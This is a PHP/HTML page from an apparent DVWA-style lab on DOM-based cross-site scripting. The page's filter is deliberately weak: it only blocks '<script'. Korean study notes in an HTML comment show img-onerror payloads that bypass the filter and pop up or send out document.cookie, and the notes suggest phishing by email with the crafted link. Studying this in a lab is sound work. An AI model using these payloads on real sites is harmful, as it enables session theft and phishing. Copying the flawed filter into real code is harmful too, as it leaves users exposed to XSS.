<!--
스크립크를 막아버리는 방법이다.
이 경우는 html 인젝션을 이용한다
그렇게 하면 시작을 <script으로만 안 들어가면 되니

일단 구성에서 오류가 나지 않게 문장을 끝내고 html 이용한다
사이트를 조작하든 아니면 그러지 않고 메일로 둔갑하여 쿠키를 빼낸다.
</option></select><img src=x onerror=alert(document.cookie)>

이렇게 하면 stored 나 reflected 처럼 페이지를 조작도 할 수 있고 조작한 사이트를 메일로 둔갑하여 피싱을 유도 할 수도 있다.

</option></select><img width="0" height="0" src="x" onerror="document.location='http://localhost/3.dvwa/10.XSS%20(Reflected)/XSS-r2.php?'+document.cookie">



-->




<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />


<?php
$b = setcookie("cookie",md5( uniqid() ), time()+300);
// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    // $_GET['default'] 가 있고 $_GET['default']의 값이 비워있지 않을때
    $default = $_GET['default'];
    // echo $default;  >>  ex) English

    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        //stripos()를 통해 필터링
        //stripos(): 대상 문자열을 앞에서부터 검색하여 찾고자 하는 문자열이 몇 번째 위치에 있는지를 리턴하는 함수
        //
        // stripos([대상 문자열], [조건 문자열], [검색 시작위치]);
        // echo stripos("PHP stripos 예제", "php").'<br>';    >>   0

        //쉽게 말해서 $_GET['default'] 에다가 집어넣은 값이 <script 인지를 시작하는 검사한다.
        //용도대로라면 항상 거짓이 나와야한다.
        //그러나 true 가 나오면 무조건 default=English 로 나오도록 유도한 것이다.

        header ("location: ?default=English");
        exit;
    }
}

?>


</head>
<body class="home">
<h1>Vulnerability: DOM Based Cross Site Scripting (XSS)</h1>

<div class="vulnerable_code_area">

    <p>Please choose a language:</p>
<form name="XSS" method="GET">
    <select name="default">
        <script>
            if (document.location.href.indexOf("default=") >= 0) {
                var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
                document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
                document.write("<option value='' disabled='disabled'>----</option>");
            }

            document.write("<option value='English'>English</option>");
            document.write("<option value='French'>French</option>");
            document.write("<option value='Spanish'>Spanish</option>");
            document.write("<option value='German'>German</option>");
        </script>
    </select>
    <input type="submit" value="Select" />
</form>
</div>
</body>
</html>
